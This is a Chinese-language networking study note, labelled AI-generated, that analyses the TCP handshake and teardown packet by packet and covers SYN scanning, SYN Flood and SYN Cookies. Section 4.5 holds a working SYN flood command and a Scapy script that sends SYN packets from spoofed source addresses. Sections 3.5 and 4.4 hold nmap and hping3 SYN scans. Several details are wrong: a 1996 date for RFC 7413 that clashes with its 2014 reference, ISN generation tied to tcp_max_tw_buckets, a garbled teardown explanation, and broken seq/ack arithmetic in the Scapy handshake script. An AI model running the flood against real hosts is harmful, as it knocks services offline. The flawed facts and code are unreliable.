---
title: "TCP三次握手四次挥手：逐包状态分析"
category: "00-基础通用/03-计算机网络"
tags: [TCP, 三次握手, 四次挥手, 状态机, SYN Flood, SYN Cookies, tcpdump, Wireshark]
level: 主攻
type: ai-generated
status: 完成
updated: 2026-09-09
---

# TCP三次握手四次挥手：逐包状态分析

> **合规声明**：本文涉及的攻防技术仅用于授权测试与学习研究，禁止用于任何未授权目标。

## 核心速查表

| 维度 | 核心内容 |
|------|----------|
| 三次握手 | 客户端SYN → 服务器SYN+ACK → 客户端ACK |
| 四次挥手 | 主动方FIN → 被动方ACK → 被动方FIN → 主动方ACK |
| 序列号 | 32位，标识字节流位置；ISN随机化防预测 |
| 握手关键选项 | MSS、SACK-Permitted、Window Scale、Timestamps |
| SYN Flood | 攻击者发送大量SYN不完成握手，填满服务器半连接队列 |
| SYN Cookies | 服务器不保存半连接状态，用加密信息编码seq |
| 挥手状态 | FIN_WAIT_1→FIN_WAIT_2→TIME_WAIT（2MSL） |
| 关联知识 | [[01-OSI与TCP-IP分层模型：封装解封装全流程]], [[08-TCP状态机与TIME_WAIT调优]], [[09-TCP流量控制：滑动窗口与零窗口探测]] |

## 1. 概述

### 1.1 技术定义

TCP（Transmission Control Protocol）是TCP/IP栈中的可靠传输层协议，提供面向连接、字节流式的端到端可靠通信。**连接建立（三次握手）**与**连接释放（四次挥手）**是TCP最核心的连接生命周期管理机制。

**为什么需要三次握手？**核心目的是双方确认彼此的**发送能力**和**接收能力**都正常，并**同步初始序列号（ISN）**。两次握手无法确认接收方也具备收发能力；同时也要防止"过期的连接请求"导致误建。

### 1.2 知识体系定位

三次握手/四次挥手以逐包分析为切入点，是理解TCP状态机（[[08-TCP状态机与TIME_WAIT调优]]）的基础。同时与流量控制（[[09-TCP流量控制：滑动窗口与零窗口探测]]）、拥塞控制（[[10-TCP拥塞控制：从Reno到BBR算法演进]]）共同构成TCP传输层三大研究方向。在安全上，SYN Flood、SYN扫描、半连接攻击都以三次握手为依托。

### 1.3 核心应用场景

- **网络排障**：查看连接卡在哪个状态判断故障方向
- **渗透测试**：SYN扫描（半开放）、TCP端口状态探测
- **DDoS攻防**：SYN Flood与SYN Cookies
- **性能分析**：握手延迟、三次握手中的往返时间估算
- **协议分析**：Wireshark/tcpdump逐包还原

### 1.4 技术演进简史

| 时间 | 事件 | 意义 |
|------|------|------|
| 1974 | TCP概念提出 | 面向连接的可靠传输 |
| 1981 | RFC 793发布 | 协议标准化（三次握手+状态机） |
| 1996 | RFC 2018诞生 | SACK选择性确认 |
| 1996 | TFO(RFC 7413)设计 | TCP Fast Open（TFO）允许数据随SYN发送（0-RTT） |
| 2001 | RFC 3168 | ECN与拥塞显式通知 |
| 2018 | RFC 8312 CUBIC | 现代拥塞控制默认 |
| 2017+ | QUIC（基于UDP） | 0-RTT连接，挑战TCP的主导地位 |

## 2. 核心原理

### 2.1 三次握手过程（建立连接）

```
客户端 (主动打开)                      服务器 (被动打开)
    |                                     |
    |--- 1. SYN (SYN=1, seq=x) -------->   |
    |          同步我的初始序列号 x         |
    |                                     |
    |<--- 2. SYN+ACK (SYN=1, ACK=1) ------|
    |       ack=x+1, seq=y                |
    |       确认收到你的seq, 同步我的seq   |
    |                                     |
    |--- 3. ACK (ACK=1, seq=x+1) -------->|
    |       ack=y+1                       |
    |       确认收到服务器的SYN+ACK         |
    |                                     |
    v                                     v
   ESTABLISHED                        ESTABLISHED
```

**为什么要三次而不是两次？**

```
网络延迟场景:
  客户端发送SYN(x), 因网络故障这个SYN被长时间延迟
  客户端超时重发SYN(x1)并成功建立连接，数据传输完毕，连接关闭
  
  此时 迟到的SYN(x) 终于到达服务器:
    - 若两次握手 → 服务器以为新连接, 分配资源并等待数据 → 浪费+误建
    - 三次握手 → 客户端收到服务器回SYN+ACK(ack=x+1)后,
       发现ack不符合预期, 因为客户端状态里没有对应连接, 便会发送RST取消
       从而避免服务器残留半连接

所以第三次ACK是"客户端对服务器SYN+ACK的确认+防旧包误建"
```

**ISN（Initial Sequence Number）初始序列号**：
- 序列号32位，[0, 2^32-1]，回绕后从0重新计
- RFC 793要求ISN每次随机化（基于时钟/随机），防止序列号预测攻击
- Linux上ISN由内核算法生成（`/proc/sys/net/ipv4/tcp_max_tw_buckets`与随机相关）

### 2.2 三次握手中双方状态变化

```
客户端: CLOSED → SYN_SENT → ESTABLISHED
服务器: CLOSED → LISTEN → SYN_RCVD → ESTABLISHED

客户端                                       服务器
 CLOSED                                      CLOSED
    |                                          |  bind+listen
    v                                          v
 SYN_SENT -------------------SYN------------->|  LISTEN
    |                                          |
    |<------------------SYN+ACK-------------- SYN_RCVD
    v                                          |
 ESTABLISHED ----------------ACK------------->|
                                               v
                                          ESTABLISHED

半开连接(半连接): 服务器处于SYN_RCVD状态的连接
  即收到SYN但还没收到ACK, 在SYN队列(syn queue)等待
  若大量SYN不响应 → SYN Flood
```

### 2.3 四次挥手过程（释放连接）

```
客户端 (主动关闭)                      服务器 (被动关闭)
    |                                     |
    |--- 1. FIN (FIN=1, seq=u) -------->  |
    |       我要关闭发送方向                  |
    |                                     |
    |<--- 2. ACK (ack=u+1) -------------  |
    |       收到你的FIN                    |
    |      (服务器若还有数据可继续发)        |
    |                                     |
    |        (服务器数据发送完毕)           |
    |                                     |
    |<--- 3. FIN (FIN=1, seq=v) --------  |
    |       我这边也发完了, 关闭             |
    |                                     |
    |--- 4. ACK (ack=v+1) --------------> |
    |       确认收到服务器的FIN             |
    |       双方完成关闭                    |
    v                                     v
  TIME_WAIT(2MSL)                     CLOSED
```

**为什么四次而不是三次？**

因为TCP是**全双工**的：关闭时两边各有独立的发送方向要关。主动方的FIN只是关闭了"主动→被动"方向，被动方可能还有数据要发，所以需要"会合点"：
- 被动方先回ACK（确认接受关闭请求）
- 待自身数据发完后再发FIN（第二个半关闭）
- 主动方再回ACK确认

**如果服务器无数据要发**，第2、3步可以合并（发送端在SYN/ACK后紧接FIN），实际抓包常看到"三次报文"（FIN、ACK+FIN、ACK）。

### 2.4 挥手过程状态转换

```
主动方:
   ESTABLISHED → FIN_WAIT_1 (发出FIN)
              → FIN_WAIT_2 (收到对端ACK)
              → TIME_WAIT  (收到对端FIN并发了最后ACK, 等2MSL)
              → CLOSED

被动方:
   ESTABLISHED → CLOSE_WAIT (收到FIN, 回ACK; 应用可继续发数据)
              → LAST_ACK   (应用关闭, 发出FIN)
              → CLOSED     (收到主动方ACK)

客户端                                       服务器
ESTABLISHED ─────┐                       ESTABLISHED
                 ▼                              
 FIN_WAIT_1 ──FIN──────▶   收到FIN ─▶ CLOSE_WAIT (回ACK)
                 │                              │
  收到ACK        │◀────────────────ACK          │
   ▼             │                              │ (应用关闭)
 FIN_WAIT_2 ◀────┘                       LAST_ACK
   (等待对端FIN) ◀──────────FIN─────────────────┘
                 │                              │
  收到FIN+发ACK  │                              │
   ▼             └──────────ACK─────────────────▶  收到ACK → CLOSED
 TIME_WAIT (2MSL)
   │
   ▼
 CLOSED
```

## 3. 详细知识点

### 3.1 TCP头部标志位与选项

**TCP头部（固定20字节）回顾**：

```
 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|        Source Port          |       Destination Port         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Data |Rsvd|C|E|U|A|P|R|S|F|            Window                |
|Offset|   |W|C|R|C|S|S|Y|I|                                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |        Urgent Pointer         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**标志位表**：

| 标志 | 含义 | 用途 |
|------|------|------|
| CWR | 拥塞窗口减少 | ECN拥塞指示 |
| ECE | ECN-Echo | ECN协商反馈 |
| URG | 紧急数据 | 紧急指针有效（很少用） |
| ACK | 确认 | 1=确认号有效（除SYN外几乎总是1） |
| PSH | 推送 | 立即交付给应用（不等待缓冲） |
| RST | 重置 | 异常终止连接 |
| SYN | 同步 | 握手用的同步标志 |
| FIN | 结束 | 正常关闭的一方 |

**握手常见选项**：

| 选项 | 说明 | 抓包体现 |
|------|------|---------|
| MSS | Max Segment Size，避免分段，如1460 | 在SYN中交换 |
| WScale | 窗口缩放因子（2^14） | 在SYN中；双方协商 |
| SACK-Permitted | 选择性确认能力 | 在SYN中；配合SACK块使用 |
| Timestamps | 时间戳（PAWS防重放） | SYN后可带；RTT估算用 |

### 3.2 逐包解析一个真实握手

**抓包**：
```bash
# 服务器启动一个http服务(如 python3 -m http.server 8080)
# 客户端连接
sudo tcpdump -i eth0 -nn port 8080 -S -w handshake.pcap
curl http://192.168.1.10:8080/
```

**用tshark查看**：
```bash
tshark -r handshake.pcap -T fields -e frame.number -e ip.src -e ip.dst \
   -e tcp.srcport -e tcp.dstport -e tcp.flags -e tcp.seq_raw \
   -e tcp.ack_raw -e tcp.window_size_value

# 示例输出:
# 1  192.168.1.10  192.168.1.20  39078 8080 0x0002  234567890  0        64240
# 2  192.168.1.20  192.168.1.10  8080  39078 0x0012  111111111  234567891 14600
# 3  192.168.1.10  192.168.1.20  39078 8080 0x0010  234567891  111111112 64240
```

对应TSHARK flags值（TCP flags位组合）：
- 0x0002 = SYN
- 0x0012 = SYN+ACK
- 0x0010 = ACK
- 0x0011 = FIN+ACK
- 0x0018 = PSH+ACK

**详细解释三个包**：

```
包1: 客户端→服务器
  flags = SYN (0x0002)
  seq   = 234567890        (客户端ISN)
  ack   = 0               (SYN包不含确认号)
  window= 64240
  options: MSS=1460, WScale=7, SACK, Timestamps

包2: 服务器→客户端
  flags = SYN+ACK (0x0012)
  seq   = 111111111        (服务器ISN)
  ack   = 234567891        (=客户端seq+1, 确认收到SYN)
  window= 14600
  options: MSS=1440(因MTU较小), WScale=7, SACK, Timestamps
  注意: 服务器确认号只+1, 因为SYN用一个序列号空间

包3: 客户端→服务器
  flags = ACK (0x0010)
  seq   = 234567891
  ack   = 111111112        (=服务器seq+1, 确认收到SYN+ACK)
  window= 64240 → 握手完成, ESTABLISHED
```

**关键认知**：
- SYN和SYN+ACK虽然不承载应用数据，但各占用**一个序列号位置**（所以ack=对方seq+1）
- 三次握手后的双向序列号：客户端发数据从seq=234567891开始，服务器从seq=111111112开始

### 3.3 半关闭（Half-Close）

TCP允许一方关闭发送而继续接收（半关闭），通过socket API `shutdown(SHUT_WR)`实现。这在管道式协议中很有用。

```
客户端 shutdown(SHUT_WR):
   客户端 ──FIN──▶ 服务器
   服务器可以继续向客户端发数据 (客户端仍能收)
   服务器 shutdown(SHUT_WR) 后:
   客户端 ──...── 服务器 (双向关闭结束)
```

### 3.4 SYN Flood攻击详解

**原理**：攻击者发送大量SYN，但收到SYN+ACK后不发送ACK，使服务器半连接队列（SYN queue）被占满：

```
正常连接:
  攻击者 ─SYN─▶ 服务器: 放入SYN队列
  攻击者 ◀─SYN+ACK─: 等待
  攻击者 ─ACK─▶ : 移入Accept队列 → 建立

SYN Flood:
  攻击者(海量伪造源IP) ─SYN─▶ 服务器: SYN队列塞满
  ──▶ 服务器无法为新的合法SYN分配资源 → 拒绝服务
  与此同时: 服务器会重发SYN+ACK(默认3-5次)和对大量伪造响应反而放大流量
```

**攻击特征**：
- 大量来源不同的SYN到达同一端口
- 服务器上出现大量`SYN_RECV`状态
- CPU资源消耗于队列管理

**检测**：
```bash
ss -s                                 # 看统计
netstat -an | grep SYN_RECV | wc -l    # 半连接数
ss -s | grep listendb                 # 半连接队列
```

**防御：SYN Cookies**：

```
原理: 服务器不保留SYN队列状态, 而是用"加密计算"生成一个特殊的序列号
     ISN = hash(源IP,源端口,目的IP,目的端口,密钥) + 时间戳等
  这个ISN既包含验证信息又含递增计时, 当收到客户端ACK时
  服务器可通过校验ACK号(ISN+1)确认是合法的完成握手的客户端
  → 无需维护SYN队列, 防御syn flood排队耗尽

内核参数:
  net.ipv4.tcp_syncookies = 1   (默认开启, 队列满时自动启用)
  或 sysctl net.ipv4.tcp_max_syn_backlog
```

**SYN Cookies的代价**：
- 丢失部分TCP选项（MSS等，会取默认值）
- 无法支持某些高级特性（如TFO、窗口缩放）
- 不适用于极高连接率场景（性能不高）

### 3.5 SYN扫描（半开放扫描）

**原理**：发送SYN，若收到SYN+ACK则端口开放；收到RST则关闭。不完成第三次握手，因此目标不建立完整连接，日志中无ACK记录、应用无感知。

```
nmap -sS 192.168.1.10 -p 80,443,22

开放端口: 收到SYN+ACK
关闭端口: 收到RST

优点: 半开放, 不需要创建完整连接
缺点: 需要root权限(原始套接字), 可能被防火墙/IPS检测到SYN泛洪特征
```

**补充：TCP Connect扫描 (-sT)**：完成完整三次握手，适合非root用户，但会在目标留下完整连接记录。

### 3.6 其他基于握手的攻击

| 攻击 | 原理 | 缓解 |
|------|------|------|
| 握手洪泛(如SYN-Flood变种) | 大量快速完成握手的TFO连接 | 限速、隧道过滤器、overload保护 |
| Half-open侦察 | SYN+ACK无ACK留下痕迹 | 日志审计检测异常SYN_RECV |
| TCP 重放 | 捕获真实握手重放（无应用层会话数据） | 序列号随机化 + 会话加密 |

## 4. 实战与示例

### 4.1 环境搭建

```bash
# 服务器 (Ubuntu): 启动HTTP服务
python3 -m http.server 8080 --bind 0.0.0.0

# 或使用nc监听
nc -lvp 9000

# 客户端: 安装性工具
sudo apt install -y netcat-openbsd curl nmap tcpdump hping3

# 抓包环境: 任一主机安装tshark/wireshark
```

### 4.2 完整抓包演示

```bash
# 终端1: 开始捕获
sudo tcpdump -i eth0 -nn -w tcp_demo.pcap 'port 8080'

# 终端2: 建立连接并发送数据
echo "hello tcp" | nc 192.168.1.20 8080

# 终端1停止后分析
tshark -r tcp_demo.pcap -V | less

# 只看标识位+序列号
tshark -r tcp_demo.pcap -T fields -e frame.number -e tcp.flags \
       -e tcp.seq_raw -e tcp.ack_raw -e tcp.len
```

### 4.3 手工构造三次握手（Scapy）

```python
#!/usr/bin/env python3
"""
用Scapy手工构造完成的TCP三次握手
"""
from scapy.all import *
import sys

SERVER_IP = "192.168.1.20"
SERVER_PORT = 8080
SRC_PORT = 45000

# ==== 第一步: SYN ====
syn = IP(dst=SERVER_IP) / TCP(sport=SRC_PORT, dport=SERVER_PORT,
                              flags="S", seq=1000)
syn_ack = sr1(syn, timeout=3, verbose=0)
if syn_ack is None:
    print("[!] 无响应")
    sys.exit(1)
print(f"收到SYN+ACK: seq={syn_ack[TCP].seq}, ack={syn_ack[TCP].ack}, "
      f"flags={syn_ack[TCP].flags}")

# ==== 第三步: ACK (完成握手) ====
ack = IP(dst=SERVER_IP) / TCP(sport=SRC_PORT, dport=SERVER_PORT,
                              flags="A",
                              seq=syn_ack[TCP].ack,       # 用服务器的seq+? 
                              ack=syn_ack[TCP].seq + 1)
send(ack, verbose=0)
print("[+] 三次握手完成")

# ==== 发送数据(可选) ====
payload = "hello from scapy"
data = IP(dst=SERVER_IP) / TCP(sport=SRC_PORT, dport=SERVER_PORT,
                               flags="PA",
                               seq=ack.ack,                # 已建立的序列空间
                               ack=ack.ack) / \
                               payload
send(data, verbose=0)

# ==== 四次挥手 ====
fin = IP(dst=SERVER_IP) / TCP(sport=SRC_PORT, dport=SERVER_PORT,
                              flags="FA",
                              seq=data[TCP].seq + len(payload),
                              ack=data[TCP].ack)
fin_ack = sr1(fin, timeout=3, verbose=0)
print(f"[+] 收到对方ACK: {fin_ack[TCP].flags}")
# 若对端还需FIN, 我们再ACK(略)
```

**常见报错**：
- `sr1`返回None → 检查防火墙/端口未监听
- 手动握手后立刻超时 → 要同步好seq/ack!

### 4.4 SYN扫描与半打开状态

```bash
# 用nmap做SYN扫描
sudo nmap -sS -p 22,80,443 192.168.1.20

# 用hping3模拟半扫描
sudo hping3 -S -p 80 192.168.1.20
```

### 4.5 SYN Flood 演示（受控环境,不要在生产上用）

```bash
# 受控实验室: 用hping3发SYN不完成握手
sudo hping3 --flood -p 80 192.168.1.20

# 若网络环境支持,也可用scapy
sudo python3 - <<'EOF'
from scapy.all import *
from random import randint
def syn_flood(target, port, count=1000):
    for i in range(count):
        pkt = IP(src=f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
                 dst=target) / TCP(dport=port, flags="S")
        send(pkt, verbose=0)
EOF
```

**观察服务器**(在服务器上)：
```bash
netstat -an | grep -c SYN_RECV
ss -s
dmesg | tail    # 若出现 synflood 警告,说明队列打满
```

### 4.6 验证SYN Cookies

```bash
# 查看内核参数
sysctl net.ipv4.tcp_syncookies
cat /proc/sys/net/ipv4/tcp_max_syn_backlog

# 观察SYN Flood期间服务器如何处理 (合法环境)
# 若 syncookies=1, 队列满时自动启用; 客户端仍能完成连接
```

### 4.7 半连接排查

```bash
# 查看SYN_RECV数量
ss -an state syn-recv | wc -l

# 查看SYN队列相关参数
sysctl net.ipv4.tcp_max_syn_backlog
sysctl net.ipv4.tcp_synack_retries   # 默认5
sysctl net.ipv4.tcp_syn_retries      # 客户端默认6
```

## 5. 常见坑与避坑指南

### 5.1 三次握手时只加1（SYN占序号）

**问题**：很多人以为SYN和后续数据在同一个序列号空间，认为ack应该加1后再加数据长度。实际SYN标志占用一个序列号单位。

**避坑**：收到SYN(seq=x)后ACK应该是x+1。若对方第2包是SYN+ACK(seq=y)，客户端的ACK是y+1。首个数据字节序列号从ISN+1开始。

### 5.2 混淆"半连接"与"半开连接"

**问题**：SYN Flood中的"半连接"（SYN_RECV）与攻击者主导的"半开放扫描"不是一回事。前者是服务器的SYN队列状态，后者是扫描器主动完成的非法RST终止。

**避坑**：SYN Flood异常在服务器端看是大量`SYN_RECV`；SYN扫描会在防火墙日志出现"半开连接"检测。

### 5.3 关闭时没有区分"强制关闭"（RST）

**问题**：四次挥手是优雅关闭；异常/时间紧迫时靠RST关闭（如连接异常、收到非法数据、程序abort）。

**避坑**：出现RST时先看时序——是正常句鼻/超时导致的，还是攻击者注入的RST（RST伪造/连接中断攻击）。双方收到RST就直接CLOSED，不会有TIME_WAIT。

### 5.4 忘记2MSL时间与TIME_WAIT

**问题**：主动关闭方发的最后ACK需要等待2MSL才能确保对方收到，避免残留报文打扰后续连接复用相同四元组。若忘掉TIME_WAIT，会导致旧连接报文污染新连接（如重放）。

**避坑**：见[[08-TCP状态机与TIME_WAIT调优]]；不要随意关闭TIME_WAIT，理解SO_REUSEADDR语义再做优化。

### 5.5 单一SYN包带载荷：TCP Fast Open的误区

**问题**：传统TCP SYN不得携带数据（0字节）。TFO(RFC 7413)允许SYN携带小载荷（须在握手成功后首包）。若未协商TFO Cookie，不能直接把数据附在SYN里。

**避坑**：一般应用协议不应在SYN里放数据。若抓包看到SYN带数据，注意是否为TFO或异常。

### 5.6 MSS/分片假设导致的握手成功但大包黑洞

**问题**：如果MSS不匹配（如MSS=1460但在路径上只允许更小），或中间设备不分片且MTU不足，握手成功但发大包时（数据长度>MTU）会因为DF而黑屏。

**避坑**：抓包确认握手协商出的MSS；若大包不通，ping -M do -s大小测试定位MTU，或用Wireshark查看"TCP Analysis"中的MSS/segment丢失标记。

## 6. 知识关联

- [[01-OSI与TCP-IP分层模型：封装解封装全流程]] — TCP在传输层的位置与封装
- [[08-TCP状态机与TIME_WAIT调优]] — 连接建立/释放是状态机的一部分
- [[09-TCP流量控制：滑动窗口与零窗口探测]] — 握手协商窗口缩放，传输中的窗口管理
- [[10-TCP拥塞控制：从Reno到BBR算法演进]] — 拥塞控制与SYN Cookies协同防御
- [[11-UDP特性与QUIC协议设计动机]] — QUIC用UDP实现0-RTT连接，对照TCP握手

## 7. 参考资料

1. RFC 793 - Transmission Control Protocol (1981) - https://datatracker.ietf.org/doc/html/rfc793
2. RFC 7413 - TCP Fast Open (2014) - https://datatracker.ietf.org/doc/html/rfc7413
3. RFC 2018 - TCP Selective Acknowledgment Options (1996) - https://datatracker.ietf.org/doc/html/rfc2018
4. RFC 1323 - TCP Extensions for High Performance (1992) - https://datatracker.ietf.org/doc/html/rfc1323
5. Linux内核port文档：`Documentation/networking/ip-sysctl.txt` (tcp_syncookies)
6. 《Web安全深度剖析》 石志国等 - ISBN 978-7-115-32815-2（SYN Flood章节）
7. 《TCP/IP详解 卷1》 - https://book.douban.com/subject/1088054/
8. Wireshark官方协议文档：https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html